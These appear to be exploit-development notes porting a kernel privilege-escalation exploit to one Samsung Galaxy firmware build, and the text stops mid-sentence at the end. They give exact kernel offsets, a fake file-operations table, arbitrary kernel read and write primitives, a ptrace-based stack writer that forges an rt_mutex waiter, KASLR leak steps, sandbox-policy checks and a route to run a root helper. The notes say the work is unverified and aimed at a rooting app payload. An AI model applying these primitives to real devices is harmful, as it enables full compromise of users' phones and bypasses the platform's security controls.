# SM-G965U1 / G965U1UES6CSG4 - Linux 4.9 port notes

Status: **research only**. Nothing in this port has been validated on a
physical `SM-G965U1`. The profile is not in `support/targets-v3.json` and must
not be published as a supported app payload until the hardware checks in
section 10 pass.

This document describes the implementation, not a proof of exploitability.
All addresses and frame sizes below were derived statically from the supplied
kernel image.

## 1. Artifacts and address model

The supplied `Files.rar` is `SM-G965U1_NA_XAA_USA`, not `SM-G695U1`:

```text
boot.img   13917457dff7650317ec8e48e5c9385f9c8e014696e5b937868042fa3a0a21df
Image      57fb5a20900ec4481e32883ded6e25236442699c8722ac4b60acaf297d84eb36
```

The full firmware archive
`SAMFW.COM_SM-G965U1_XAA_G965U1UES6CSG4_fac.zip` was also verified:

```text
archive SHA-256  70afd520965791a6a675194eca7c6053c50f88628c194ca03abf24ca72a4f1d5
AP tar SHA-256   8dbeded47f79d46f748c981f433c3a7d2f0f18dedb57eb42759b7bfac4e010bb
```

The AP tar inside the archive is byte-identical to the extracted
`AP_G965U1UES6CSG4_...tar.md5`; `boot.img` extracted from it is
byte-identical to `Files.rar`, and the decompressed kernel `Image` is
byte-identical to the image used for the offset work. Section 9 records the
firmware cross-checks in detail.

`vmlinux.elf` was recovered from `Image` with `vmlinux-to-elf`. It contains
156,023 symbols. The link-time base is:

```c
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
```

For the image-backed range, the raw `Image` offset of a virtual address is
`va - KIMAGE_TEXT_BASE`. `.bss` is not present in `Image`, so BSS-only objects
must be reached through the exploit's read primitive after boot, not from the
file.

`sys_call_table` entries appear as zero in the static image because arm64
stores them as `R_AARCH64_RELATIVE` relocations, applied by the kernel at boot.
The relocation entries confirm the direct table targets:

```text
sys_call_table + 117*8 -> sys_ptrace  0xffffff80080bb8a0
sys_call_table +  98*8 -> sys_futex   0xffffff800815e88c
sys_call_table + 220*8 -> sys_clone   0xffffff80080abd54
```

This matters for stack geometry: `el0_svc` loads the table entry and executes
`blr x16` with `sp` still at the syscall entry frame. There is no intermediate
wrapper, so the frame arithmetic below starts at the named `sys_*` function.

## 2. Profile decisions

The target header is `src/targets/star2qlteue-G965U1UES6CSG4/target.h`.

| Item | Value | Reason |
| --- | --- | --- |
| `LEGACY_FOPS` | `1` | 4.9 uses `.read`/`.write`, not `.read_iter`/`.write_iter` |
| `LEGACY_RT_MUTEX_WAITER` | `1` | 4.9 waiter has no `wake_state`/`ww_ctx` |
| `SLIDE_USE_FAKE_TASK` | `0` | use the real `init_task`/`root_task_group`; 4.9 fake-task offsets are unverified |
| `MM_ORDER` | `3` | SLUB order for a 0x348-byte `mm_struct` on 8 CPUs |
| `STRUCT_PAGE_TYPE_IS_MEMCG` | `1` | 4.9 has no `page_type`; `+0x38` is `mem_cgroup` |
| `SLIDE_STACK_WRITER` | `3` | `PTRACE_SETREGSET`/`NT_PRFPREG` writer |
| `P0_ORACLE_PROBE_OFFSET` | `0x1f0000` | generated fingerprint probe |
| `SLIDE_TRACEFS_EVENT_ID` | `71` | backported `sched_blocked_reason` |

KernelSU is not viable: the kernel has no `CONFIG_KPROBES`, no
`CONFIG_FUNCTION_TRACER`, and `CONFIG_MODULE_SIG_FORCE=y`. The only root route
in scope is a standalone `su` helper loaded through
`call_usermodehelper_exec_work`.

## 3. Legacy configfs file operations

### 3.1 Why `configfs_write_bin_file` is not used

4.9 still ships `configfs_write_bin_file` at offset `0x00265c38`, but that path
resolves the `configfs_buffer` and `config_item` through the real
`file->f_path.dentry` / inode. An ashmem file's dentry is not a configfs
dentry, so the lookup cannot be steered with the fake object. The classic
`.read`/`.write` callbacks are used instead.

### 3.2 Fake fops table

The table lives at payload offset `FOPS_OFF = 0x2000`:

```text
owner         0x00  0
llseek        0x08  noop_llseek
read          0x10  configfs_read_file
write         0x18  configfs_write_file
unlocked_ioctl 0x48 ashmem_ioctl
compat_ioctl  0x50  compat_ashmem_ioctl
mmap          0x58  ashmem_mmap
open          0x60  ashmem_open
release       0x70  ashmem_release
splice_read   0xb8  generic_file_splice_read
```

There is no `.read_iter`, `.write_iter`, or `.show_fdinfo` on this driver.
`llseek` is populated while the payload is built. The post-load repair cannot
write it later without clearing the low half of `.read`, because every legacy
write zeroes two bytes past its range (section 3.4).

### 3.3 Arbitrary read

`configfs_read_file` at `0xffffff80082e59f8` checks `buffer->needs_read_fill`
at `0x48`. When it is zero, the `attr->show` callback is skipped and the
function calls:

```c
simple_read_from_buffer(user, count, ppos, buffer->page, buffer->count)
```

The fake `configfs_buffer` layout used by the port is:

```text
count             0x00
pos               0x08
page              0x10
ops               0x18
mutex             0x20
needs_read_fill   0x48
read_in_progress  0x4c
write_in_progress 0x4d
bin_buffer        0x50
bin_buffer_size   0x58
```

The first 11 bytes of `ashmem_area.name` are the fixed `/dev/ashmem` prefix.
When the ashmem area is reinterpreted as a `configfs_buffer`, those bytes become
`count = 0x6d6873612f766564` (`"dev/ashm"`), a large read length. 4.9
`set_name()` writes the user string at `name + ASHMEM_NAME_PREFIX_LEN`, so all
blob offsets are shifted by 11.

`configfs_read_once()` installs a `page` and a file position `pos` such that
`page + pos == target`. The page value is written through `ASHMEM_SET_NAME`,
which is a NUL-terminated string copy, so the helper searches for a `pos` that
makes every byte of `page` non-zero. It then sets `needs_read_fill = 0` and
uses `pread(fd, data, len, pos)`.

The read side does not have the two-byte collateral problem; only the write
side does.

### 3.4 Arbitrary write and the two-byte collateral

The 4.9 `configfs_write_file` at `0xffffff80082e5fa8` was disassembled. Its
fault path is:

```text
count = min(write_count, 0xfff)
copy_from_user(buffer->page, user, count)   -> nonzero on fault
memset(buffer->page + count - fault, 0, fault)
buffer->needs_read_fill = 1
buffer->page[count] = 0
return -EFAULT                              (flush_write_buffer is not reached)
```

The payload source is mapped so that it ends exactly at a `PROT_NONE` page.
The write length is `chunk + 1`, so the copy faults after `chunk` payload
bytes. The uncopied byte is zero-filled, and `buffer->page[chunk + 1]` is then
set to zero. The result is:

```text
[target, target + chunk)          payload, already written
[target + chunk, target + chunk + 2)  two zero bytes
```

The function returns `-1/EFAULT` even on success; the wrapper checks for that
exact error and verifies every chunk with `configfs_read_once()`. Chunks are
64 bytes, so a long write is a sequence of re-pointed `buffer->page` writes.

Before each chunk, `legacy_write_prepare_page()` installs the target page
pointer at `buffer->page` (`0x10`). The blob spans `0x0b..0x4b` and is written
with `try_set_ashmem_name_blob()`. There are two reasons the blob cannot stop
at the pointer:

- `configfs_write_file()` takes `buffer->mutex` at `0x20` before touching
  `buffer->page`. The ashmem area's `name[]` beyond the 11-byte prefix is
  uninitialised, so the blob must zero the fake mutex (and `needs_read_fill`)
  or the next call spins on a bogus owner.
- `ASHMEM_SET_NAME` is a NUL-terminated `strcpy`; kernel addresses routinely
  contain zero bytes. `try_put_blob_no_zeros()` would turn those bytes, and
  every zero in the mutex, into `0x01`. `try_set_ashmem_name_blob()` composes
  the exact byte string by walking the zero positions from the end backwards.

The read path uses the same composition for its 128-byte blob, so both
`configfs_read_file()` and `configfs_write_file()` always see a zeroed fake
mutex at entry.

The unavoidable consequence is that **every** legacy write zeroes the two
bytes immediately after the requested range. Callers must either rewrite those
bytes with a later write or ensure they fall in padding. Two bootstrap
restores were designed around this:

- **misc fops restore**: `struct miscdevice` has `fops` at `0x10`, followed by
  `list` at `0x18`, `parent` at `0x28`, `this_device` at `0x30`, `groups` at
  `0x38`, `nodename` at `0x40`, and `mode` at `0x48`. The port snapshots and
  rewrites `0x10..0x49` as one 0x3a-byte bundle. The two collateral zeroes land
  at `0x4a..0x4b`, in the tail padding before `ashmem_shrinker`.
- **boot_id restore**: the `random_table` entry is a `struct ctl_table` with
  `procname 0x00`, `data 0x08`, `maxlen 0x10`, `mode 0x14`, `child 0x18`. The
  port reads the first 0x18 bytes, verifies `child == NULL`, replaces only the
  `data` pointer, and writes the snapshot back. The two collateral zeroes land
  at `0x18..0x19`, the low two bytes of the already-NULL `child` pointer. The
  Image relocation at `random_table+0x140` resolves `procname` to the
  `"boot_id"` string and `data` to `sysctl_bootid`
  (`0xffffff800aed8a88`), confirming the entry.

Note: the app `APP_PHYS_P0_ORACLE` flow currently skips
`restore_slide_boot_id()`; the restore is exercised by the non-app path.
Whether the app path leaves the `data` pointer modified is unverified and must
be checked on hardware.

On 4.9, `nfulnl_logger+0x8` is a 32-bit type/priority field and `+0x10` is the
relocated `logfn` pointer. The port deliberately does **not** enable
`SLIDE_RB_PARENT_TYPE_RESTORE`: the legacy write that would restore the type
also zeroes two bytes at `+0x10`, corrupting `logfn`. The type may remain
modified after the chain walk; this is a known side effect, not a root
blocker.

Static audit of the remaining call sites:

| Call site | Collateral target | Status |
| --- | --- | --- |
| `restore_slide_boot_id()` 0x18-byte entry | `child` low 2 bytes, verified NULL | designed safe |
| `restore_misc_fops_bundle()` 0x3a bytes | `miscdevice` tail padding | designed safe |
| `try_cfi_stage()` scratch payload | payload scratch | safe |
| `restore_p0_oracle_pages()` 8 bytes at `page+0x20` | `page+0x28..0x29` (`lru.prev` / `compound_dtor`) | unverified |
| `pipe_phys_read/write()` 0x28-byte pipe_buffer patch | next pipe_buffer `page` low 2 bytes | unverified |
| `forge_pipe_buffers_on_page()` first pipe_buffer of each 0x800 object | next pipe_buffer `page` low 2 bytes | unverified |
| pipe proof writes/restores | adjacent bytes in the proof page | unverified |
| `SLIDE_RB_PARENT_TYPE_RESTORE` | `nfulnl_logger+0x10` (`logfn`) | disabled |

The pipe_buffer cases are only harmless while the kernel uses the first
buffer of each pipe ring, or while the affected slots are never consumed.
They must be checked on hardware. The 0x20/0x28 case depends on the probe
pages not being on an LRU list, which is also unverified.

Writes that are immediately followed by another write covering the same bytes
are safe; the last two bytes of each call are not. This is one of the largest
remaining correctness risks in the port.

## 4. Memory geometry

### 4.1 `mm_struct` slab order and object stride

`struct mm_struct` is requested as 0x348 bytes in `proc_caches_init`
(confirmed by the `mov x1, #0x348` before `kmem_cache_create`). The cache
is created with `SLAB_HWCACHE_ALIGN`, so SLUB rounds the object size up to
the 64-byte cache line:

```text
object stride = ALIGN(0x348, 64) = 0x380
```

SLUB's default `min_objects` is:

```text
min_objects = 4 * (fls(nr_cpu_ids) + 1)
            = 4 * (fls(8) + 1)
            = 4 * (4 + 1)
            = 20
```

`calculate_order()` starts from the aligned size:

```text
fls(20 * 0x380 - 1) - PAGE_SHIFT
= fls(0x45ff) - 12
= 15 - 12
= 3
```

So the slab is order 3: 32 KiB, 36 objects, 0x200 spare. If Samsung
booted with `slub_min_objects=16` the order would instead be 2. Verify
with:

```sh
cat /sys/kernel/slab/mm_struct/order          # expect 3
cat /sys/kernel/slab/mm_struct/object_size    # expect 840 (0x348)
cat /sys/kernel/slab/mm_struct/objs_per_slab  # expect 36
```

KernelSnitch walks direct-map candidates by `MM_STRUCT_SZ`, so the target
must use the aligned stride 0x380. An earlier port used 0x348; it can only
land on object indices 15 and 30 of a 36-object slab and therefore almost
always misses the leaked `mm_struct`, which is the observed
`pipe KernelSnitch sk_buff page leak failed` on hardware.

### 4.2 `struct page`

4.9 `struct page` relevant fields:

```text
compound_head  0x20
slab_cache     0x30
mem_cgroup     0x38
```

There is no `page_type` field. `STRUCT_PAGE_TYPE_IS_MEMCG=1` makes the pipe
diagnostic label `+0x38` as `memcg` instead of treating it as a page type. The
value is only used for logging and heap-shaping checks.

### 4.3 Payload and bank layout

```text
FOPS_OFF    0x2000
LOCK_OFF    0x2210
W0_OFF      0x2350
SCRATCH_OFF 0x3000
FAKE_TASK_OFF 0x3200
RIGHT_OFF   0x4440
LEFT_OFF    0x5550
```

The app profile also builds four bank slots:

```text
SLIDE_BANK_SLOTS       4
SLIDE_BANK_TASK_OFF    0x1000
SLIDE_BANK_TASK_STRIDE 0x1c0
SLIDE_BANK_LOCK_OFF    0x5200
SLIDE_BANK_SLOT_STRIDE 0x100
SLIDE_BANK_WAITER_OFF  0x40
```

The bank gives the retry loop independent fake task/lock/waiter objects so a
failed attempt does not reuse a corrupted tree.

### 4.4 `sk_buff` reclaim geometry

`__alloc_skb` in the supplied `Image` adds 0x180 bytes for
`skb_shared_info`:

```text
ffffff80091c4784: add w20, w20, #0x180
ffffff80091c47ac: sub w4, w0, #0x180
```

Therefore:

```text
SKB_DATA_ALIGN(sizeof(struct skb_shared_info)) = 0x180
SKB_MAX_HEAD(0) = PAGE_SIZE - 0x180 = 0xE80
UNIX_SKB_FRAGS_SZ = PAGE_SIZE << get_order(32768) = 0x8000
```

`unix_stream_sendmsg` caps one skb at `SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ`
= 0x8E80: 0xE80 bytes of linear head data followed by one order-3 fragment
page. The fragment payload starts at message offset 0xE80, which is exactly
why `SKB_DATA_DELTA = -0xE80`. The target sets `SKB_SEND_SIZE = 0x8E80` so
each send produces one skb and one order-3 page instead of the generic
0x10000 default, which would split into two skbs and consume an extra
order-3 page.

`SKB_RECLAIM_SENDS` is raised to 64 (the nonblocking socket send buffer is
the real limit) so the freed `mm_struct` slab has several chances to be
reclaimed as a fragment page. This matches the proven PTRACE-writer
profiles, but the reclaim itself is still hardware-unverified here.

## 5. Futex waiter geometry

### 5.1 Call chain

The 4.9 syscall chain is:

```text
sys_futex                                  frame 0x080
do_futex                                   frame 0x130
futex_wait_requeue_pi.constprop.19         frame 0x1c0
```

Inside `futex_wait_requeue_pi.constprop.19`:

```text
x29 = S0 - 0x370
add x22, x29, #0x90    -> real struct rt_mutex_waiter at S0 - 0x2e0
add x19, x29, #0x148   -> on-stack struct futex_q at S0 - 0x228
```

`S0` is the individual `sys_*` entry stack pointer. The real waiter is 0x50
bytes, spanning `S0-0x2e0 .. S0-0x290`.

An earlier draft treated the `futex_q` at `x29+0x148` as the waiter. That is
wrong. The `rt_mutex_finish_proxy_lock` call site at `0xffffff800815cb70`
passes `x2 = x22 = x29+0x90`, which is the real waiter. All writer offsets
were corrected accordingly.

### 5.2 `struct rt_mutex_waiter`

```text
tree_entry      0x00
pi_tree_entry   0x18
task            0x30
lock            0x38
prio            0x40
deadline        0x48
size            0x50
```

The `deadline` field is real on this Samsung build. In
`task_blocks_on_rt_mutex` the kernel executes:

```text
ldr x0, [task, #0x4c8]
str x0, [waiter, #0x48]
```

so the object is 0x50 bytes, not 0x48. The profile writes zero to
`waiter+0x48`.

### 5.3 Stale waiter

CVE-2026-43499 is the proxy-lock rollback bug: `remove_waiter()` uses
`current` rather than `waiter->task` while unwinding
`rt_mutex_start_proxy_lock`. The on-stack waiter is removed from the lock tree,
but the task's `pi_blocked_on` pointer is left pointing at it. When
`futex_wait_requeue_pi` returns, the waiter bytes are stale stack data, but the
dangling pointer still walks into them on the next PI operation.

The exploit therefore has to refill that exact stack range with a controlled
fake waiter before the consumer calls `sched_setattr()` on the waiter thread.

### 5.4 Fake waiter values

The PTRACE writer builds the same values as the non-fresh pselect path:

```text
tree_parent   nfulnl_logger + slide
tree_right    0
tree_left     boot_id data pointer + slide
pi_parent     nfulnl_logger + slide
pi_right      0
pi_left       boot_id data pointer + slide
task          init_task + slide
lock          fake_lock (payload)
prio          0
deadline      0
```

`SLIDE_USE_FAKE_TASK=0` is deliberate. A fake task would require verified 4.9
offsets for `pi_lock`, `pi_waiters`, `pi_top_task`, `pi_blocked_on`, `prio`,
`normal_prio`, `deadline`, and the scheduler/cgroup fields. The real
`init_task` is used instead. This makes the PI walk touch the idle task's PI
state and may cause a spurious wakeup; that behavior is unverified on hardware.

The fake lock's owner field is `1`, i.e. `RT_MUTEX_HAS_WAITERS` with a NULL
owner. `rt_mutex_owner()` masks the low bit and returns NULL, so the chain takes
the unlocked path and does not dereference a bogus task pointer.

The payload also builds a second fake waiter at `W0_OFF`. The fake lock's
`waiters.rb_node` and `waiters_leftmost` point at it, so
`rt_mutex_top_waiter(fake_lock)` returns that waiter and the unlocked path's
`wake_up_process()` targets `init_task`. The on-stack waiter is the one reached
through the stale `pi_blocked_on`.

## 6. Stack writer selection

### 6.1 Rejected: pselect

`sys_pselect6` frame is 0xa0 and `core_sys_select` frame is 0x1b0, with the
`fd_set` storage at `x29+0xa8`. The resulting buffer is far shallower than
`S0-0x2e0`. The pselect writer cannot reach the 4.9 waiter even with a word
shift. `SLIDE_PSELECT_WORD_SHIFT 0` is kept only for build parity.

### 6.2 Rejected: 64-bit ashmem `SET_NAME`

The 64-bit path is:

```text
sys_ioctl 0x40 -> do_vfs_ioctl 0xb0 -> ashmem_ioctl 0xa0
-> set_name frame 0x140, strncpy_from_user destination x29+0x38
```

That lands at `S0-0x298`, which is `waiter+0x48`: it reaches only `deadline`
and later bytes, not `task`, `lock`, or `prio`. The compat path lands at
`S0-0x2e8`, but it requires a 32-bit task and is still a NUL-terminated string
copy, so it cannot carry embedded zero bytes. Both are rejected.

Native 64-bit WEXT/route ioctls were also checked. `compat_wext_handle_ioctl`
reaches deeper but is 32-bit-only; the native `wext_handle_ioctl` frame is only
0x50. The route/ethtool paths either do not copy attacker bytes at the needed
depth or require capabilities that an app does not have.

### 6.3 Selected: `PTRACE_SETREGSET` / `NT_PRFPREG`

The selected writer uses the FPSIMD regset copy in `fpr_set()`:

```text
sys_ptrace             frame 0x040
arch_ptrace            frame 0x010
ptrace_request         frame 0x0e0
ptrace_regset          frame 0x040
fpr_set                frame 0x280
```

`fpr_set` starts with `sub sp, sp, #0x240` and then
`stp x29, x30, [sp, #-0x40]!`, so:

```text
x29 = S0 - 0x3f0
FPSIMD buffer = x29 + 0x60 = S0 - 0x390
buffer size   = 0x210
```

The stale waiter begins at `S0-0x2e0`, which is buffer offset:

```text
0x390 - 0x2e0 = 0xb0
```

The 0x210-byte buffer spans `S0-0x390 .. S0-0x180`, so the whole waiter fits at
offset `0xb0..0xff` with plenty of room after it.

`ptrace_regset` passes:

```text
request = PTRACE_SETREGSET (0x4205)
note    = NT_PRFPREG (2)
pos     = 0
count   = iov.len (0x210)
kbuf    = NULL
ubuf    = iov.base
```

The regset element size is 4 bytes, and `0x210 % 4 == 0`, so the length check
passes and `count` is clamped to the full 0x210 bytes. `fpr_set` copies the
child's current FPSIMD state into the stack buffer, then overwrites `count`
bytes from `ubuf`, then copies the buffer back into the child's
`thread.fpsimd_state`. The child's FPSIMD state is corrupted, which is
harmless: the tracee stays stopped and is only used as a ptrace target.

The Samsung `five_ptrace` hook is called by `sys_ptrace` before
`arch_ptrace`, but it returns before the deep call, so it does not change the
frame total. For request `0x4205` it falls into the audit branch when the word
at the traced task's `+0xad8` is non-zero and calls `five_audit_err`; it still
returns 0. Whether a stock `G965U1` treats that audit as blocking is unknown.

## 7. PTRACE writer implementation

The writer is in `src/slide_app.c`:

```text
slide_ptrace_prepare()
slide_build_ptrace_waiter()
slide_ptrace_stack_copy()
```

### 7.1 Preparation

The tracee must exist before the futex wait. `slide_ptrace_prepare()` runs in
the waiter thread before `FUTEX_LOCK_PI`:

1. raw `clone(SIGCHLD)` creates a separate process;
2. the child calls `PTRACE_TRACEME`, then `tgkill(getpid(), gettid(),
   SIGSTOP)`;
3. the parent `waitpid()`s until `WIFSTOPPED(status)`.

The waiter thread is the tracer. Doing this before the futex wait matters:
if the tracee were created after the waiter became stale, the `clone`,
`ptrace`, and `waitpid` syscalls could overwrite the very stack range the
writer is about to refill.

### 7.2 Write and handshake

After the futex wait times out, the waiter unlocks the chain lock and waits for
the owner to acquire it. Then `slide_ptrace_stack_copy()`:

1. zeroes a 0x210-byte aligned buffer;
2. builds the fake waiter at offset `0xb0`;
3. sets `iov_base = buffer`, `iov_len = 0x210`;
4. resets the consume state;
5. calls `syscall(SYS_ptrace, PTRACE_SETREGSET, child, NT_PRFPREG, &iov)`;
6. on success sets `slide_consume_go = 1` and spins on `slide_consume_stop`
   without making any syscall;
7. after the consumer finishes, records `slide_consume_sched_ok` in
   `slide_stack_write_window` and sets `slide_route_done`.

The no-syscall spin is required. Any syscall on the waiter thread re-enters the
kernel on the same stack and can overwrite the fake waiter before
`sched_setattr()` walks the PI chain. The only synchronization used after the
ptrace call is atomic load/store and `yield`. An interrupt taken on the waiter
core can also reuse the top of that kernel stack; the handshake keeps the
window short but cannot eliminate that race.

The consumer thread runs `sched_setattr_tid(waiter_tid, ...)`, which enters
`rt_mutex_adjust_prio_chain()` and dereferences the stale
`pi_blocked_on -> waiter`. If the chain survives the fake values, the
`tree_left`/`pi_left` pointers reach the `boot_id` data object and the
subsequent restore path can put it back.

## 8. KASLR, P0, and the root helper

### 8.1 KASLR leak

The backported `sched_blocked_reason` trace event is at index 54 in the
`__start_ftrace_events` array. 4.9 starts dynamic event IDs at
`__TRACE_LAST_TYPE + 1` (`17`), giving `71`. The record layout is:

```text
pid      +0x08
caller   +0x10
io_wait  +0x18
```

`SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x0004ca4c` is the saved return PC in
`worker_thread`. Verify the event ID on the device before trusting the leak:

```sh
cat /sys/kernel/debug/tracing/events/sched/sched_blocked_reason/id
```

Samsung's 4.9 `init.rc` mounts tracefs under debugfs
(`/sys/kernel/debug/tracing`), not `/sys/kernel/tracing`. The non-app
`slide.c` leak currently hardcodes `/sys/kernel/tracing`, so it fails with
`errno=2` on this firmware. The app P0 path does not use tracefs for the
leak; use that path for device testing. See section 10.

`nfulnl_logger` is at `0x0299d480`; its first qword points at the
`"nfnetlink_log"` string at `0x021d82e0`. The existing first-qword leak model
still applies.

### 8.2 P0 fingerprint

`src/targets/star2qlteue-G965U1UES6CSG4/p0_fingerprint.h` was generated from the raw
`Image` at probe offset `0x1f0000`:

- 32 candidate slides, `0x000000 .. 0x1f0000` in 64 KiB steps;
- 8 qwords per slide at offsets `0x000, 0x200, ... 0xe00`;
- 256 qwords total.

Each row maps an actual slide to `Image[0x1f0000 - slide]`. The table is only
as good as the physical load address assumption. The current profile uses:

```c
#define P0_PAGE_OFFSET       0xffffffc000000000ULL
#define P0_PHYS_OFFSET       0x80000000ULL
#define P0_KERNEL_PHYS_LOAD  0x80080000ULL
#define VMEMMAP_START        0xffffffbf00000000ULL
#define SKB_DATA_DELTA       (-0xe80LL)
```

`P0_PAGE_OFFSET` and `VMEMMAP_START` are taken from the `address_markers`
table in this exact `Image` (section 9.4), not from the 5.x profiles. The
earlier 0xffffff8000000000 / 0xffffff7f00000000 pair was wrong for this
kernel: 0xffffff8000000000 is `VA_START`/the modules region, while the
linear map starts at `PAGE_OFFSET = 0xffffffc000000000`. The profile and
the rebuilt payloads use the corrected values.

`P0_KERNEL_PHYS_LOAD` comes from the arm64 header `text_offset = 0x80000`
and XBL's `"Kernel"` reservation at `0x80000000` (section 9.2). It is
consistent with the firmware, but the exact physical placement inside the
87 MiB kernel region is still a boot-time property. Confirm `_text` from
`/proc/iomem`, a boot log, or the P0 oracle on hardware.
`SKB_DATA_DELTA` is inherited from the Samsung 5.x profiles and has not
been calibrated for 4.9.

### 8.3 Root helper

The root route is the standalone helper:

```text
ROOT_UMH_PATH        /data/local/tmp/cve-2026-43499-root
ROOT_UMH_WORK_OFF    0x6000
ROOT_UMH_DATA_OFF    0x6200
CALL_USERMODEHELPER_EXEC_WORK  _text + 0x00048c5c
SYSTEM_UNBOUND_WQ              _text + 0x02994780
```

The 4.9 workqueue layout is **not** the 5.x/6.x layout. The current values in
`target.h` (`PWQ_WQ_OFF`, `PWQ_WORK_COLOR_OFF`, `POOL_WORKLIST_OFF`, ...) are
placeholders that let the profile build. They must be re-derived from the 4.9
`workqueue.c` disassembly before the UMH stage can work.

## 9. Full-firmware verification

The complete `SAMFW.COM_SM-G965U1_XAA_G965U1UES6CSG4_fac.zip` was used
for the checks below. They confirm static assumptions only; none of them is
a substitute for a run on a physical `SM-G965U1`.

### 9.1 Boot image and kernel identity

```text
archive SHA-256  70afd520965791a6a675194eca7c6053c50f88628c194ca03abf24ca72a4f1d5
AP tar SHA-256   8dbeded47f79d46f748c981f433c3a7d2f0f18dedb57eb42759b7bfac4e010bb
boot.img SHA-256 13917457dff7650317ec8e48e5c9385f9c8e014696e5b937868042fa3a0a21df
Image SHA-256    57fb5a20900ec4481e32883ded6e25236442699c8722ac4b60acaf297d84eb36
```

The AP tar in the archive matches the extracted tar. Its `boot.img.lz4`
decompresses to the same `boot.img` as `Files.rar`; the gzip kernel payload
decompresses to the same `Image` used for every offset in this document.
The `Image` header contains `text_offset = 0x80000`, `image_size =
0x33fb000`, `flags = 0xa`, and magic `ARMd`. The `boot.img` header uses
`page_size = 0x1000`, `kernel_addr = 0x8000` (legacy, ignored for arm64),
and the cmdline includes `androidboot.selinux=permissive`. The cmdline has
no `slub_min_objects` or `slub_max_order` parameter. `proc_caches_init`
creates the `mm_struct` cache with size `0x348`; with the default
`min_objects = 4 * (fls(8) + 1) = 20`, the SLUB order is 3. This still
needs `/sys/kernel/slab/mm_struct/order` on the device.

### 9.2 XBL kernel region

`xbl.elf` contains the DDR memory map:

```text
0x80000000, 0x05700000, "Kernel", AddMem, SYS_MEM,
  SYS_MEM_CAP, Reserv, WRITE_BACK_XN
```

so the kernel region starts at `0x80000000` and is 87 MiB long. The next
reserved region is `hyp_region@85700000` (6 MiB). Combined with
`text_offset = 0x80000`, the expected physical `_text` is
`0x80080000`, which is the value used by `P0_KERNEL_PHYS_LOAD`. The
bootloader can still place the image at a different offset inside the
region, so the P0 fingerprint's 32 x 64 KiB candidates remain a physical
placement assumption.

### 9.3 KASLR

The image contains `kaslr_early_init`, the `kaslr-seed` property name, the
`nokaslr` check, and the `qcom,msm-imem-kaslr_offset` node. The boot cmdline
does not contain `nokaslr`. `kaslr_early_init` computes the text offset as

```c
mask = ((1UL << (VA_BITS - 2)) - 1) & ~(SZ_2M - 1);
offset = seed & mask;
```

The disassembly uses the immediate `0x1fffe00000`, i.e. VA_BITS = 39,
which is a 2 MiB-aligned virtual offset over a 128 GiB range. The lower
21 bits (`0x1fffff`) are used separately to randomize
`module_alloc_base`; they are not the text-slide mask. The P0 fingerprint's
2 MiB physical scan is therefore not evidence of a 2 MiB virtual KASLR
range.

No boot component in the firmware contains the literal `kaslr-seed`:
`xbl.elf`, `xbl_config.elf`, `abl.elf`, the other decompressed BL images,
the static DTB, and `sec.dat` were searched. The only `kaslr` string in
`xbl.elf` is a ramdump-region label, and `set_kaslr_flag` in
`bksecapp.mbn`/`NON-HLOS.bin` writes a security flag, not an FDT property.
The kernel's `kaslr_imem_addr` BSS variable also has no code reference in
the disassembly. The expected seed is therefore zero, so the
`kaslr_early_init` seed path contributes no virtual offset and no
`memstart_addr` randomization.

A second mechanism still produces a slide. `stext` computes
`x23 = __PHYS_OFFSET & (SZ_2M - 1)`, i.e. the physical misalignment of the
loaded image inside its 2 MiB-aligned base. `__primary_switched` keeps
that value when `kaslr_early_init` returns zero, and
`__create_page_tables` adds `x23` to `KIMAGE_VADDR + TEXT_OFFSET` when it
maps the image. For the 64 KiB-granular placements covered by the 32-row
P0 table, the physical misalignment therefore becomes the virtual slide
even without a seed:

```text
_text physical = 0x80080000 + slide
_text virtual  = 0xffffff8008080000 + slide
```

That equality is what lets the port use one `slide` for both text and
direct-map aliases. It breaks if the bootloader places the image at a
2 MiB-aligned offset outside the first 2 MiB (`x23 == 0`, virtual slide 0
but physical slide nonzero), or if a real seed is injected. Confirm the
observed slide and the two bases on hardware.

The seed path would also set `memstart_offset_seed` (variable at
`0xffffff800a4885ac`) from `seed >> 48` at instruction
`0xffffff800a406ea0`, and `arm64_memblock_init` would lower
`memstart_addr` below `0x80000000`. `PHYS_OFFSET` is `memstart_addr`, so a
full 64-bit seed would change the direct-map base. The payload's
`P0_PAGE_OFFSET | (phys - P0_PHYS_OFFSET)` aliases, `direct_to_page()`, and
the P0 oracle all assume `memstart_addr == 0x80000000`; a nonzero high half
would make them read a shifted physical page and fail the fingerprint. The
app also caps the tracefs/physical slide at `0x3f8000` (4 MiB - 32 KiB).
With the expected zero seed this is safe; if hardware shows a seed-derived
slide instead, a `memstart_addr` leak is needed before the direct-map stage.

### 9.4 Virtual layout and the direct-map correction

The image contains an `address_markers` table with the 4.9 layout
boundaries:

```text
modules start        0xffffff8000000000
modules end / KIMAGE 0xffffff8008000000
...
vmemmap start        0xffffffbf00000000
linear map start     0xffffffc000000000
linear map end       0xffffffffffffffff
```

This is the standard 39-bit layout: `PAGE_OFFSET = 0xffffffc000000000`
and `VMEMMAP_SIZE = 4 GiB`, hence
`VMEMMAP_START = 0xffffffbf00000000`. The values previously copied from
the 5.x profiles (`0xffffff8000000000` and `0xffffff7f00000000`) were
wrong for this kernel. The `kfree` disassembly independently confirms the
pair: `virt_to_head_page()` computes

```asm
ubfx x0, x21, #12, #26        ; page index relative to PAGE_OFFSET
mov  x1, #0xffbf00000000
movk x1, #0xffff, lsl #48     ; x1 = 0xffffffbf00000000
orr  x0, x1, x0, lsl #6       ; struct page = VMEMMAP_START + index*64
```

`target.h`, the direct-map aliases, the pipe `struct page` arithmetic, and
the kernelsnitch identity range were corrected accordingly and the payloads
rebuilt. `_text` is consistent with the same table:
`0xffffff8008000000 + 0x80000 = 0xffffff8008080000`.

### 9.5 SELinux, Yama, and seccomp

* The platform policy contains
  `(allow untrusted_app_all self (process (ptrace)))` at
  `plat_sepolicy.cil:15442`; the vendor policy does not remove it.
* The app seccomp filter `arm64_app_filter` has 57 entries at
  `libandroid_runtime.so:0x1f2698`. `_set_seccomp_filter` prepends the
  architecture check and the `seccomp_data.nr` load; for syscall 117
  (`ptrace`) the binary-search path ends at `SECCOMP_RET_ALLOW`
  (`0x7fff0000`). Syscalls such as 142 and 291 instead reach the trailing
  `SECCOMP_RET_TRAP`.
* The kernel has no `yama_ptrace_access_check` or `ptrace_scope` symbols,
  so Yama is probably absent. This still needs `/proc/sys/kernel/yama`.
* The cmdline requests `androidboot.selinux=permissive`, but the build is
  `ro.build.type=user` with `ro.build.selinux=1`. AOSP 9 user builds
